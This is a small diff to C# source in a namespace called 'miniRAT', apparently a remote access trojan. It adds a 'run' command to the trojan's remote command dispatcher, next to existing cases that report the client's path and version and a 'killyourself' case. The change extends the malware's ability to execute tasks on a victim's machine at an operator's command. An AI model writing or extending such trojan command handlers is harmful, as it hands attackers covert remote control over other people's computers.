@@ -396,6 +396,8 @@ namespace miniRAT
                         return Assembly.GetExecutingAssembly().GetName().Version.ToString();
                     case "powershell":
                         return "todo powershell"; //TODO: run powershell
+                    case "run":
+                        return RUN.runThread(commandArray[1], commandArray[2]);
                     case "clientpath":
                         return AppDomain.CurrentDomain.BaseDirectory + AppDomain.CurrentDomain.FriendlyName;
                     case "killyourself":
